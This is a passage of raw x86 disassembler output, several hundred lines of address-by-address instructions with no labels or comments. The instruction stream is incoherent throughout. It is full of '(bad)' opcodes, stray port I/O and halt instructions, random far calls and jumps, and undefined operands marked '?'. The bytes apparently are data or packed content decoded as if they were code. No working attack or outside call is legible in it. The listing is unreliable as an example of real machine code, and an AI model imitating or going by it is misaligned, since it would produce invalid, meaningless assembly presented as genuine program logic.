  416e8c:	cmp    ecx,DWORD PTR ds:0x929a4a21
  416e92:	or     DWORD PTR [edi],esp
  416e94:	retf   
  416e95:	mov    ch,0x2f
  416e97:	mul    DWORD PTR [ebx-0x61]
  416e9a:	dec    ebp
  416e9b:	ss cmc 
  416e9d:	and    edi,DWORD PTR fs:[ebx-0x7b]
  416ea1:	sbb    al,0x2
  416ea3:	push   ds
  416ea4:	out    0xe2,eax
  416ea6:	or     al,0xf1
  416ea8:	enter  0x314c,0x8d
  416eac:	out    dx,eax
  416ead:	and    DWORD PTR [ecx],ecx
  416eaf:	sbb    BYTE PTR [ebx-0x5c3a395c],ch
  416eb5:	inc    sp
  416eb7:	mov    DWORD PTR [edx-0x28c236b5],edi
  416ebd:	xchg   edx,eax
  416ebe:	test   BYTE PTR [esi+0x4a],dl
  416ec1:	adc    BYTE PTR [edx-0x1a],al
  416ec4:	pushf  
  416ec5:	push   0xffffffaa
  416ec7:	push   es
  416ec8:	mov    edx,0xa9efec74
  416ecd:	mov    bh,dl
  416ecf:	xor    BYTE PTR [ebx+0x491013e8],0xbb
  416ed6:	sbb    al,cl
  416ed8:	mov    ds:0xe94e2a64,al
  416edd:	hlt    
  416ede:	cmp    dl,BYTE PTR [eax-0x15]
  416ee1:	in     al,0x70
  416ee3:	cmp    dh,0xdb
  416ee6:	push   es
  416ee7:	das    
  416ee8:	int3   
  416ee9:	push   esp
  416eea:	sahf   
  416eeb:	dec    ebp
  416eec:	scas   eax,DWORD PTR es:[edi]
  416eed:	jl     0x416ee0
  416eef:	mov    ds:0x7ce9f6d1,eax
  416ef4:	mov    dl,0x34
  416ef6:	repz rcl BYTE PTR [ebp-0x21],1
  416efa:	add    ch,dl
  416efc:	cmp    al,0xdf
  416efe:	ds dec ebx
  416f00:	xor    eax,0x5df31cb
  416f05:	lea    ebx,[ecx-0x38]
  416f08:	mov    esi,0x1f836987
  416f0d:	cmp    BYTE PTR [edi-0x222ffc64],al
  416f13:	gs inc ebx
  416f15:	cmp    esp,DWORD PTR [ecx+0x4e]
  416f18:	inc    ecx
  416f19:	xchg   ecx,eax
  416f1a:	ins    BYTE PTR es:[edi],dx
  416f1b:	fisttp WORD PTR [edx-0x6e]
  416f1e:	repz mov esp,0x4335373
  416f24:	push   0x5ef1e854
  416f29:	fbstp  TBYTE PTR [edi+0x78]
  416f2c:	inc    edx
  416f2d:	imul   dh
  416f2f:	jmp    0x2f75:0x1bbcc4c3
  416f36:	xchg   ebx,eax
  416f37:	inc    edi
  416f38:	pusha  
  416f39:	push   ecx
  416f3a:	add    eax,0x12022f8f
  416f3f:	cli    
  416f40:	fst    DWORD PTR [eax-0x1d]
  416f43:	leave  
  416f44:	mov    ah,0x99
  416f46:	(bad)  
  416f48:	retf   0xe9cd
  416f4b:	fsub   QWORD PTR [ecx]
  416f4d:	sbb    edi,DWORD PTR [eax]
  416f4f:	into   
  416f50:	jge    0x416f3e
  416f52:	or     BYTE PTR [eax],bh
  416f54:	popf   
  416f55:	wbinvd 
  416f57:	push   esp
  416f58:	sbb    cl,BYTE PTR [edx+0xa]
  416f5b:	mov    dl,0x5d
  416f5d:	dec    eax
  416f5e:	or     eax,DWORD PTR [edi+0x764712b1]
  416f64:	pop    esi
  416f65:	mov    al,BYTE PTR [ecx-0x284fa404]
  416f6b:	cmp    al,0x70
  416f6d:	push   0x7c9251df
  416f72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f73:	jmp    0x829a74ee
  416f78:	das    
  416f79:	jg     0x416fa8
  416f7b:	dec    edx
  416f7c:	pop    esp
  416f7d:	out    0x27,eax
  416f7f:	xor    DWORD PTR [ebx],0x7d7c3a5e
  416f85:	push   es
  416f86:	cmp    al,0x26
  416f88:	cmp    eax,0xef50a480
  416f8d:	and    esi,DWORD PTR [ebp+0x5e]
  416f90:	dec    edi
  416f91:	cmp    al,dl
  416f93:	call   0xde998071
  416f98:	fsubr  QWORD PTR [edx-0x73]
  416f9b:	test   eax,0xab42bf3d
  416fa0:	mov    ch,0x68
  416fa2:	push   es
  416fa3:	out    dx,al
  416fa4:	mov    WORD PTR [edx],cs
  416fa6:	fsubr  DWORD PTR [esi+0x44]
  416fa9:	or     dh,bh
  416fab:	repz in eax,dx
  416fad:	xchg   DWORD PTR [ebx],esp
  416faf:	lock jb 0x417030
  416fb2:	cwde   
  416fb3:	into   
  416fb4:	push   ds
  416fb5:	ins    BYTE PTR es:[edi],dx
  416fb6:	leave  
  416fb7:	or     al,0x5d
  416fb9:	xchg   ebp,eax
  416fba:	mov    al,0xf9
  416fbc:	mov    eax,ds:0x59c7b6c9
  416fc1:	cwde   
  416fc2:	ret    
  416fc3:	cdq    
  416fc4:	scas   al,BYTE PTR es:[edi]
  416fc5:	mov    bl,0xd1
  416fc7:	pop    esi
  416fc8:	(bad)  
  416fc9:	cld    
  416fca:	pusha  
  416fcb:	imul   edx,DWORD PTR ds:0x853469c8,0xffffffeb
  416fd2:	popf   
  416fd3:	and    al,0x16
  416fd5:	popf   
  416fd6:	enter  0x23e7,0x59
  416fda:	popf   
  416fdb:	repz sub al,0x72
  416fde:	repnz scas al,BYTE PTR es:[edi]
  416fe0:	mov    ecx,0x2483ff91
  416fe5:	cwde   
  416fe6:	jns    0x416fab
  416fe8:	aad    0x1d
  416fea:	and    bh,cl
  416fec:	mov    al,BYTE PTR [esp+edi*8]
  416fef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ff0:	pop    ecx
  416ff1:	loopne 0x41704b
  416ff3:	data16 xchg BYTE PTR [ebp-0x4e],bh
  416ff7:	jne    0x417032
  416ff9:	fmul   QWORD PTR [edi-0x60a20e6e]
  416fff:	push   ds
  417000:	inc    ebx
  417001:	imul   ebp,DWORD PTR [eax+0x31],0xa3f38a7c
  417008:	ins    DWORD PTR es:[edi],dx
  417009:	ret    
  41700a:	shr    BYTE PTR [eax-0x1aaa9e0a],1
  417010:	or     eax,0x5df1ea4
  417015:	leave  
  417016:	xor    BYTE PTR [ebx],dh
  417018:	mov    ds:0x13f998b8,eax
  41701d:	call   0x87b8:0x15efd3e7
  417024:	call   0xfd46:0xb6b20eb3
  41702b:	jg     0x417054
  41702d:	push   esp
  41702e:	ds (bad) 
  417030:	loop   0x416ffe
  417032:	jns    0x4170b0
  417034:	xor    eax,0xb75ca23
  417039:	repz (bad) 
  41703c:	mov    ds:0x8ffe6073,al
  417041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417042:	xchg   esp,eax
  417043:	xchg   esi,eax
  417044:	sbb    ecx,esi
  417046:	sbb    eax,DWORD PTR [edx]
  417048:	(bad)
  41704b:	aam    0xd7
  41704d:	mov    es,WORD PTR [esi]
  41704f:	call   0x7f06:0x70ad248
  417056:	xchg   edi,eax
  417057:	xchg   DWORD PTR [ebp+0x291f41e7],edi
  41705d:	loope  0x4170ad
  41705f:	pusha  
  417060:	xlat   BYTE PTR ds:[ebx]
  417061:	in     eax,dx
  417062:	test   eax,0xeb48c416
  417067:	aam    0x87
  417069:	call   0x502ae59
  41706e:	sbb    ah,BYTE PTR [eax]
  417070:	cmp    ebx,DWORD PTR [ecx+0x6e2041d2]
  417076:	ins    DWORD PTR es:[edi],dx
  417077:	cmc    
  417078:	fwait
  417079:	call   0x8334e6e7
  41707e:	call   0x95d635e7
  417083:	mov    dl,0xa5
  417085:	test   DWORD PTR [ebp-0x36e1f92b],ebp
  41708b:	in     eax,dx
  41708c:	fisttp DWORD PTR fs:[ebx+0x6d1bb808]
  417093:	mov    esi,0xa9fe3fd3
  417098:	sub    edx,ecx
  41709a:	es loope 0x41710e
  41709d:	lds    edi,FWORD PTR [edi-0x15d3f624]
  4170a3:	call   0x3f26:0x6fd9265d
  4170aa:	xor    DWORD PTR [ebx],edx
  4170ac:	cs enter 0xa53b,0x5f
  4170b1:	(bad)  
  4170b2:	daa    
  4170b3:	lods   al,BYTE PTR ds:[esi]
  4170b4:	push   esi
  4170b5:	sbb    cl,BYTE PTR [ecx+eax*2-0x789db5eb]
  4170bc:	call   0x5814:0xeb76e1de
  4170c3:	push   esi
  4170c4:	stc    
  4170c5:	out    dx,eax
  4170c6:	push   esp
  4170c7:	mov    ds:0xdc3cf366,eax
  4170cc:	dec    edx
  4170cd:	rol    eax,0x7e
  4170d0:	xchg   DWORD PTR [ebx-0x55d0d3ed],esp
  4170d6:	xor    eax,0xe658c53f
  4170db:	mov    eax,0x3bb710bf
  4170e0:	dec    eax
  4170e1:	xor    BYTE PTR [eax],dl
  4170e3:	and    dh,BYTE PTR [ebx-0xef59379]
  4170e9:	push   es
  4170ea:	leave  
  4170eb:	fisttp QWORD PTR [esi-0x65360a3e]
  4170f1:	aaa    
  4170f2:	es call 0x1871:0x33fc4905
  4170fa:	mov    BYTE PTR [esi-0x547ba521],ah
  417100:	and    al,BYTE PTR [ebx-0x1392fdf3]
  417106:	and    DWORD PTR [ebp-0x171b3600],edi
  41710c:	add    dh,dh
  41710e:	add    DWORD PTR [edi-0x4b],esi
  417111:	dec    ecx
  417112:	adc    al,0x2f
  417114:	mov    eax,ds:0x6187408
  417119:	mov    ebx,0xf6539dcf
  41711e:	out    dx,al
  41711f:	jle    0x41713d
  417121:	ss push 0x7cbe9df4
  417127:	mov    al,ds:0x2df000c0
  41712c:	repz xchg esi,eax
  41712e:	jl     0x417168
  417130:	rcr    DWORD PTR [edx+0x4b8c34c4],cl
  417136:	shr    DWORD PTR [ecx+0x42fa551b],0x1b
  41713d:	scas   eax,DWORD PTR es:[edi]
  41713e:	dec    esi
  41713f:	inc    edx
  417140:	inc    ebp
  417141:	stos   DWORD PTR es:[edi],eax
  417142:	sbb    eax,0xb34dce72
  417147:	cmp    ebp,DWORD PTR [ebx-0x69215b55]
  41714d:	shl    BYTE PTR [esp+esi*8-0x7d4806ff],0x95
  417155:	dec    ecx
  417156:	stc    
  417157:	scas   eax,DWORD PTR es:[edi]
  417158:	mov    al,ds:0xf6db3330
  41715d:	and    DWORD PTR [ebx+0x7e],edx
  417160:	shr    DWORD PTR [edx+eiz*1-0x629ce879],1
  417167:	cmp    bh,bh
  417169:	xor    bh,BYTE PTR [ebp-0x4498344b]
  41716f:	inc    ebp
  417170:	adc    ebp,edi
  417172:	std    
  417173:	push   esi
  417174:	pusha  
  417175:	scas   al,BYTE PTR es:[edi]
  417176:	fldl2e 
  417178:	xor    eax,edi
  41717a:	push   ecx
  41717b:	xor    DWORD PTR [ebx+0x60],esp
  41717e:	int    0xef
  417180:	and    BYTE PTR [ecx+ecx*4],0x97
  417184:	fwait
  417185:	mov    ds:0xf82a4be,eax
  41718a:	in     al,0x65
  41718c:	dec    ebp
  41718d:	test   DWORD PTR [ecx-0x6b948f2b],0x51c00d7a
  417197:	lea    edx,[ebx-0x66]
  41719a:	dec    edx
  41719b:	pop    ds
  41719c:	cmp    BYTE PTR [edx+0x51],bl
  41719f:	dec    esi
  4171a0:	jbe    0x417140
  4171a2:	dec    ebx
  4171a3:	loopne 0x41721f
  4171a5:	nop
  4171a6:	ins    DWORD PTR es:[edi],dx
  4171a7:	mov    cl,0xc7
  4171a9:	adc    BYTE PTR [ecx+0x35],dl
  4171ac:	es gs jnp 0x4171b7
  4171b0:	(bad)  
  4171b1:	or     al,0xf7
  4171b3:	mov    DWORD PTR [edi],esp
  4171b5:	es pop edx
  4171b8:	stos   DWORD PTR es:[edi],eax
  4171b9:	pop    edx
  4171ba:	inc    esp
  4171bb:	jge    0x417158
  4171bd:	dec    BYTE PTR [edi+0x5734d5a5]
  4171c3:	lea    edi,[edx+0x58b73708]
  4171c9:	push   es
  4171ca:	test   DWORD PTR [ecx-0x5d],esi
  4171cd:	aam    0x49
  4171cf:	dec    esp
  4171d0:	lods   al,BYTE PTR ds:[esi]
  4171d1:	fnstcw WORD PTR [eax-0x11b1f9ea]
  4171d7:	pop    ds
  4171d8:	(bad)  ds:0x6d301337
  4171de:	ror    DWORD PTR [esi+0x31],0xb5
  4171e2:	sbb    eax,0x2cd34d3d
  4171e7:	loope  0x4171ee
  4171e9:	lds    eax,FWORD PTR [eax-0x718e2fb3]
  4171ef:	rcl    DWORD PTR [ecx],1
  4171f1:	call   0x75fe:0x7bbe166f
  4171f8:	mov    bl,0x83
  4171fa:	mov    ds:0xd8cbaa7a,al
  4171ff:	std    
  417200:	loope  0x41727a
  417202:	mov    DWORD PTR [eax-0x7b9bc26e],ebp
  417208:	mov    ?,WORD PTR [edx+0x67c6f3a5]
  41720e:	loop   0x417271
  417210:	in     eax,dx
  417211:	jae    0x417244
  417213:	mov    esi,0xffed0b44
  417218:	add    al,0xa0
  41721a:	cmc    
  41721b:	int    0xe
  41721d:	imul   esp,DWORD PTR [ebp+0x5b6334a],0xffffffe8
  417224:	cwde   
  417225:	sti    
  417226:	mov    esp,ss
  417228:	fild   QWORD PTR [ecx-0x10]
  41722b:	dec    ebx
  41722c:	inc    esp
  41722d:	jne    0x4171dc
  41722f:	push   ss
  417230:	ret    
  417231:	jecxz  0x4171d0
  417233:	sub    ebp,ebp
  417235:	or     ecx,DWORD PTR [edx-0x5d]
  417238:	call   0x63fe:0x6843ae7b
  41723f:	pop    ebp
  417240:	adc    esi,DWORD PTR [ebp+0x36bc3451]
  417246:	dec    ebx
  417247:	jmp    0xb8a3:0x1d68fed5
  41724e:	mov    ch,0xeb
  417250:	push   ebp
  417251:	nop
  417252:	dec    ebx
  417253:	adc    al,0x91
  417255:	adc    edi,edi
  417257:	push   edi
  417258:	ss mov eax,0xb20c52ef
  41725e:	adc    edx,DWORD PTR [esi+ebx*8+0x3e22d769]
  417265:	fidiv  DWORD PTR [ebx]
  417267:	push   esp
  417268:	push   ecx
  417269:	jg     0x417297
  41726b:	ret    
  41726c:	scas   al,BYTE PTR es:[edi]
  41726d:	cmp    dh,BYTE PTR [esp+esi*2]
  417270:	sbb    dx,WORD PTR [edi-0x4d]
  417274:	dec    edi
  417275:	push   es
  417276:	lods   eax,DWORD PTR ds:[esi]
  417277:	mul    ah
  417279:	clc    
  41727a:	scas   eax,DWORD PTR es:[edi]
  41727b:	inc    ebp
  41727c:	cwde   
  41727d:	imul   ebx,ebp,0x68
  417280:	aaa    
  417281:	mov    esi,0xf12e631
  417286:	inc    esp
  417287:	cmp    ch,bh
  417289:	call   DWORD PTR [ebp+0x45a41bb4]
  41728f:	xor    eax,0x572f77d1
  417294:	xlat   BYTE PTR ds:[ebx]
  417295:	out    0xf2,eax
  417297:	xor    cl,bl
  417299:	push   ss
  41729a:	pushf  
  41729b:	xor    BYTE PTR [ecx],bh
  41729d:	mov    eax,ds:0x9739b1b1
  4172a2:	outs   dx,DWORD PTR ds:[esi]
  4172a3:	sub    DWORD PTR [esi+ecx*1],eax
  4172a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172a7:	ret    0x1785
  4172aa:	pop    eax
  4172ab:	test   eax,0x87503d23
  4172b0:	cmp    ebp,edi
  4172b2:	mov    DWORD PTR [eax-0x65],edi
  4172b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172b6:	sbb    DWORD PTR [edx],esp
  4172b8:	fstp   DWORD PTR [ebx-0x4cb90162]
  4172be:	inc    esp
  4172bf:	push   eax
  4172c0:	mov    ecx,0x4c7ee063
  4172c5:	cli    
  4172c6:	dec    esi
  4172c7:	addr16 mov al,ds:0x5e64
  4172cb:	scas   eax,DWORD PTR es:[edi]
  4172cc:	ficom  DWORD PTR [edi-0x58778f23]
  4172d2:	add    edi,DWORD PTR [ecx+0x30ee86b2]
  4172d8:	into   
  4172d9:	and    DWORD PTR [edi-0x4af40f7a],ecx
  4172df:	les    eax,FWORD PTR [esi-0x73]
  4172e2:	sbb    edx,esi
  4172e4:	fbstp  TBYTE PTR ds:0x57679074
  4172ea:	xlat   BYTE PTR ds:[ebx]
  4172eb:	outs   dx,DWORD PTR ds:[esi]
  4172ec:	fsubr  st(3),st
  4172ee:	push   edi
  4172ef:	mov    eax,ds:0x7753e946
  4172f4:	(bad)  
  4172f5:	dec    esp
  4172f6:	mov    ah,0xd2
  4172f8:	xchg   esi,eax
  4172f9:	lahf   
  4172fa:	sbb    ah,BYTE PTR [edx-0x2e]
  4172fd:	in     eax,0xd0
  4172ff:	test   DWORD PTR [edi],edx
  417301:	(bad)  
  417302:	jmp    0xe0b4d4ae
  417307:	jl     0x417382
  417309:	mov    ds:0x58f3baa8,eax
  41730e:	js     0x4172a2
  417310:	mov    edi,0x1911391a
  417315:	jmp    0xfb84:0x600bd927
  41731c:	and    BYTE PTR [edi+0x1c],0xa6
  417320:	js     0x417313
  417322:	or     ecx,DWORD PTR [edx+0x4c]
  417325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417326:	mov    ?,WORD PTR [eax+0x27]
  417329:	stos   DWORD PTR es:[edi],eax
  41732a:	jmp    0x828409bb
  41732f:	sbb    eax,0xff43f58e
  417334:	xlat   BYTE PTR ds:[ebx]
  417335:	jge    0x41736c
  417337:	nop
  417338:	rcl    bh,cl
  41733a:	(bad)  
  41733b:	into   
  41733c:	push   edx
  41733d:	cmp    DWORD PTR [ebx-0x4bcefd88],edi
  417343:	pop    edi
  417344:	xchg   BYTE PTR [edi+0x3444d532],dh
  41734a:	ss icebp 
  41734c:	push   cs
  41734d:	cmp    ah,dl
  41734f:	repz ds jmp 0x8c296409
  417356:	pop    ebp
  417357:	xchg   esi,eax
  417358:	js     0x4173a1
  41735a:	push   ds
  41735b:	push   esp
  41735c:	lock xchg edx,eax
  41735e:	jmp    0x9905f983
  417363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417364:	in     al,dx
  417365:	sbb    eax,0xac6719c7
  41736a:	inc    ebp
  41736b:	test   DWORD PTR [eax],0x62533ca
  417371:	bnd jno 0x4173df
  417374:	push   0x47ceea82
  417379:	push   0x1a
  41737b:	sbb    eax,DWORD PTR [edi+0x5dc10a13]
  417381:	sbb    cl,BYTE PTR [edx-0x7d1b4b29]
  417387:	test   ebp,eax
  417389:	call   0x72fe5625
  41738e:	out    0xe0,al
  417390:	rcl    DWORD PTR [edx+0x49ad4480],1
  417396:	hlt    
  417397:	test   DWORD PTR [edi],edx
  417399:	icebp  
  41739a:	mov    di,0x5fbd
  41739e:	sbb    DWORD PTR [ebx],eax
  4173a0:	lds    ecx,FWORD PTR [esi+edx*8]
  4173a3:	js     0x417367
  4173a5:	pop    eax
  4173a6:	push   eax
  4173a7:	dec    esp
  4173a8:	jo     0x417375
  4173aa:	fimul  WORD PTR es:[ebx+0x63254782]
  4173b1:	mov    dh,0x98
  4173b3:	scas   al,BYTE PTR es:[edi]
  4173b4:	jb     0x4173a0
  4173b6:	fsin   
  4173b8:	pushf  
  4173b9:	ja     0x4173d5
  4173bb:	and    BYTE PTR [ebp-0x70],al
  4173be:	shl    BYTE PTR [edi-0x7d],1
  4173c1:	fistp  QWORD PTR [ecx-0x53029fa3]
  4173c7:	out    0xe1,al
  4173c9:	test   BYTE PTR [esi-0x5c5bf74d],dl
  4173cf:	pop    ebp
  4173d0:	cmp    edi,DWORD PTR [edx+ebp*4-0x30f8b048]
  4173d7:	and    al,ch
  4173d9:	jp     0x417414
  4173db:	hlt    
  4173dc:	frstor [ebp+0x6a]
  4173df:	cmp    al,BYTE PTR [ebx+esi*4+0x4595ede5]
  4173e6:	dec    ecx
  4173e7:	push   ss
  4173e8:	jmp    0x1fe9:0xdfac034f
  4173ef:	add    al,0xd5
  4173f1:	in     eax,dx
  4173f2:	lods   eax,DWORD PTR ds:[esi]
  4173f3:	sub    ah,BYTE PTR [edx+0x16874885]
  4173f9:	push   ds
  4173fa:	ror    BYTE PTR [eax],1
  4173fc:	xchg   edi,eax
  4173fd:	lock addr16 loop 0x41743e
  417401:	outs   dx,DWORD PTR ds:[esi]
  417402:	or     DWORD PTR [ecx-0x4e5a49b5],eax
  417408:	hlt    
  417409:	fwait
  41740a:	sbb    BYTE PTR ds:0xa17ef13f,0xb3
  417411:	in     al,0xab
  417413:	(bad)  
  417414:	(bad)
  417417:	int    0xc9
  417419:	jmp    0x4173d6
  41741b:	mov    ch,0xf
  41741d:	hlt    
  41741e:	sbb    cl,cl
  417420:	(bad)  
  417421:	test   eax,0xe8ba1792
  417426:	xchg   ebp,eax
  417427:	and    DWORD PTR ds:0xb34dd0fb,esp
  41742d:	lahf   
  41742e:	jl     0x4173be
  417430:	addr16 cmc 
  417432:	cs cld 
  417434:	lods   al,BYTE PTR ds:[esi]
  417435:	xor    BYTE PTR [ebx],0x6a
  417438:	or     BYTE PTR [ebp+0x5d],bh
  41743b:	loop   0x41744c
  41743d:	cmc    
  41743e:	loop   0x4173e3
  417440:	add    BYTE PTR ds:0x717ec2cc,cl
  417446:	retf   
  417447:	seto   BYTE PTR [edi]
  41744a:	pusha  
  41744b:	out    dx,eax
  41744c:	shl    bl,1
  41744e:	mov    BYTE PTR [eax+0x7963b469],ah
  417454:	outs   dx,BYTE PTR ds:[esi]
  417455:	mov    edx,0xc66834ee
  41745a:	xchg   BYTE PTR [edx+0x4e967849],ah
  417460:	add    edx,DWORD PTR fs:0xe45bf6b5
  417467:	inc    esi
  417468:	lods   eax,DWORD PTR ds:[esi]
  417469:	jg     0x417461
  41746b:	lock mov ch,0x63
  41746e:	push   eax
  41746f:	pop    eax
  417470:	enter  0xc73e,0xe0
  417474:	addr16 jp 0x4174ab
  417477:	mov    ch,0xfb
  417479:	cmp    bh,BYTE PTR [ecx-0x28]
  41747c:	adc    dh,BYTE PTR es:[eax]
  41747f:	push   edi
  417480:	or     BYTE PTR [ebx+ecx*8-0x77],bl
  417484:	(bad)  
  417485:	in     al,dx
  417486:	int    0xde
  417488:	call   0x3af6:0x1013e668
  41748f:	pop    ebx
  417490:	push   eax
  417491:	leave  
  417492:	adc    bh,BYTE PTR [esi-0x7d]
  417495:	retf   0xa452
  417498:	add    eax,0x6ce9f269
  41749e:	push   esi
  41749f:	imul   eax,DWORD PTR [edx],0x67
  4174a2:	ja     0x417446
  4174a4:	sbb    BYTE PTR [eax],0xd1
  4174a7:	(bad)  
  4174a8:	mov    eax,ds:0xe7128c14
  4174ad:	pop    es
  4174ae:	mov    al,ds:0xa71161cd
  4174b3:	(bad)  [ecx-0x7d]
  4174b6:	mov    ch,0x74
  4174b8:	jmp    0x4174c9
  4174ba:	fistp  WORD PTR [eax+0xe]
  4174bd:	mov    esi,0x27eb4f64
  4174c2:	xchg   edi,eax
  4174c3:	cmp    BYTE PTR [eax],cl
  4174c5:	sbb    BYTE PTR [ebx+0x34c0a57f],ch
  4174cb:	aad    0xa9
  4174cd:	std    
  4174ce:	xchg   edi,eax
  4174cf:	lock cmp DWORD PTR [esi+0x1c],0xaf4c6e68
  4174d7:	mov    esi,0xd0c7fd92
  4174dc:	push   ds
  4174dd:	sbb    esp,edx
  4174df:	retf   0x17f0
  4174e2:	cmp    eax,0x5818ac8a
  4174e7:	sti    
  4174e8:	aam    0xeb
  4174ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174eb:	or     eax,0x88c16da
  4174f0:	stos   BYTE PTR es:[edi],al
  4174f1:	cmp    DWORD PTR [ebp-0x18b3d20d],ebx
  4174f7:	pop    esi
  4174f8:	jmp    0x41747f
  4174fa:	pop    ebp
  4174fb:	call   0xbac9:0xdab82cb9
  417502:	ret    0x762d
  417505:	fiadd  DWORD PTR [ebp-0x2117fa14]
  41750b:	dec    ebp
  41750c:	mov    ebx,0x422fa558
  417511:	out    0xae,al
  417513:	add    eax,0x89088497
  417518:	inc    eax
  417519:	iret   
  41751a:	mov    WORD PTR ds:0xe29ae84,ds
  417520:	sbb    eax,0x9f55499e
  417525:	dec    edi
  417526:	aaa    
  417527:	inc    ebp
  417528:	fucomp st(4)
  41752a:	ins    DWORD PTR es:[edi],dx
  41752b:	pop    eax
  41752c:	xchg   ebx,eax
  41752d:	fs xchg ecx,eax
  41752f:	sub    BYTE PTR [edx+0x1e],bh
  417532:	sahf   
  417533:	dec    ebp
  417534:	lds    esi,FWORD PTR [edx+ebp*4]
  417537:	ficomp DWORD PTR [edi-0x58]
  41753a:	or     al,0x16
  41753c:	pop    esi
  41753d:	test   DWORD PTR [edi],ebx
  41753f:	outs   dx,BYTE PTR ds:[esi]
  417540:	or     al,0x9b
  417542:	ss dec eax
  417544:	leave  
  417545:	lahf   
  417546:	sbb    BYTE PTR [edi],dl
  417548:	adc    esp,eax
  41754a:	in     eax,0x94
  41754c:	add    BYTE PTR [esi+0x7c],dl
  41754f:	cli    
  417550:	dec    edx
  417551:	jl     0x4175a2
  417553:	inc    edi
  417554:	test   DWORD PTR [ecx],0x7604e0a4
  41755a:	mov    ch,0xc
  41755c:	dec    ecx
  41755d:	sar    ebp,cl
  41755f:	ja     0x41753c
  417561:	sub    bl,BYTE PTR [ebx-0x24]
  417564:	mov    ecx,0xdadbee34
  417569:	out    dx,al
  41756a:	mov    esp,0xcef35bcf
  41756f:	mov    BYTE PTR [esi+0x33],bh
  417572:	adc    eax,0x21891fc9
  417577:	jmp    0xc3c1:0x18f0b09d
  41757e:	inc    edi
  41757f:	lods   eax,DWORD PTR ds:[esi]
  417580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417581:	sti    
  417582:	sub    edx,ebx
  417584:	scas   eax,DWORD PTR es:[edi]
  417585:	pop    ss
  417586:	out    dx,al
  417587:	mov    bl,0xac
  417589:	push   esi
  41758a:	mov    al,0x46
  41758c:	fimul  WORD PTR [edi-0x2]
  41758f:	jecxz  0x4175d2
  417591:	pop    ecx
  417592:	les    ebx,FWORD PTR [ebx]
  417594:	shr    BYTE PTR [ebx-0x1202d0ea],1
  41759a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41759b:	ins    BYTE PTR es:[edi],dx
  41759c:	addr16 ja 0x41753c
  41759f:	nop
  4175a0:	cwde   
  4175a1:	jnp    0x4175ca
  4175a3:	jge    0x4175e4
  4175a5:	jp     0x41757f
  4175a7:	call   0x3c93:0x71de0e13
  4175ae:	imul   DWORD PTR [eax+eax*8+0x73]
  4175b2:	cwde   
  4175b3:	mov    ch,0x1d
  4175b5:	mov    eax,ds:0xcbf30313
  4175ba:	sub    ecx,DWORD PTR [edi+0x6447d357]
  4175c0:	out    dx,eax
  4175c1:	jp     0x41757a
  4175c3:	jno    0x4175dc
  4175c5:	call   ebp
  4175c7:	jno    0x41757a
  4175c9:	int3   
  4175ca:	pop    esi
  4175cb:	rol    DWORD PTR [ebp+0x65],0xb1
  4175cf:	cmp    DWORD PTR [edx+ecx*2+0x73],0xa8ad8dc3
  4175d7:	cmp    eax,edi
  4175d9:	dec    esi
  4175da:	cmp    eax,esp
  4175dc:	popf   
  4175dd:	sub    eax,DWORD PTR [ecx-0x3a860b44]
  4175e3:	mov    cl,0x31
  4175e5:	(bad)  
  4175e6:	(bad)  
  4175e7:	int    0x15
  4175e9:	sbb    ah,BYTE PTR [edi]
  4175eb:	lahf   
  4175ec:	cmp    ah,BYTE PTR [edx]
  4175ee:	inc    ebx
  4175ef:	add    DWORD PTR [edi+esi*2+0x38],eax
  4175f3:	(bad)  
  4175f4:	ror    DWORD PTR [eax-0x75968450],1
  4175fa:	sub    esi,DWORD PTR [ecx]
  4175fc:	and    BYTE PTR [eax+0x66cff636],ch
  417602:	enter  0x7e4b,0x26
  417606:	int    0x70
  417608:	jo     0x41763a
  41760a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41760b:	pusha  
  41760c:	rcr    BYTE PTR [ebp+0x192aa3b7],cl
  417612:	sub    al,0xb1
  417614:	push   edi
  417615:	enter  0xc556,0xa3
  417619:	fs inc edi
  41761b:	rcl    BYTE PTR [ebx],cl
  41761d:	adc    edi,DWORD PTR [esi-0x5863c0f1]
  417623:	enter  0xde30,0xc1
  417627:	call   0xf70e:0x9ce46607
  41762e:	jnp    0x417677
  417630:	repz (bad) 
  417632:	(bad)  
  417634:	stos   BYTE PTR es:[edi],al
  417635:	xor    DWORD PTR [eax-0xa],esi
  417638:	sahf   
  417639:	sub    cl,bh
  41763b:	pop    ebx
  41763c:	fs mov edi,0x9fe243a8
  417642:	and    esp,esi
  417644:	pop    DWORD PTR [edi+0x31]
  417647:	mov    ebx,DWORD PTR [ecx-0x262ae2b3]
  41764d:	mov    ds:0x6977eecc,eax
  417652:	pop    ecx
  417653:	arpl   cx,cx
  417655:	retf   0x2d0c
  417658:	push   0xffffffc8
  41765a:	call   0x3fc68f1c
  41765f:	pop    ecx
  417660:	mov    esp,0x6708b83b
  417665:	(bad)  
  417666:	push   cs
  417667:	add    DWORD PTR ds:0xbb0d818,edi
  41766d:	jne    0x417696
  41766f:	xor    edi,DWORD PTR [ebx-0x1f]
  417672:	ficomp DWORD PTR [edx+esi*4+0x65]
  417676:	xchg   BYTE PTR [ebx-0x10],bl
  417679:	outs   dx,WORD PTR ds:[esi]
  41767b:	sti    
  41767c:	imul   eax,DWORD PTR [esi],0x59c1ade0
  417682:	push   cs
  417683:	(bad)  
  417684:	stc    
  417685:	jbe    0x417692
  417687:	xchg   ebp,eax
  417688:	into   
  417689:	push   ebp
  41768a:	mov    ah,BYTE PTR [esi-0x2c]
  41768d:	mov    dh,0x29
  41768f:	out    0x2b,al
  417691:	cld    
  417692:	jg     0x417688
  417694:	enter  0xc425,0x75
  417698:	push   ebx
  417699:	std    
  41769a:	pop    ds
  41769b:	sbb    ah,BYTE PTR [ecx+0x4e]
  41769e:	or     ebp,edi
  4176a0:	xchg   ebp,eax
  4176a1:	push   eax
  4176a2:	mov    ds:0x3f065e51,eax
  4176a7:	adc    DWORD PTR [ebx+edi*2-0x4e45cb2b],0xffffffcb
  4176af:	push   edx
  4176b0:	sub    cl,cl
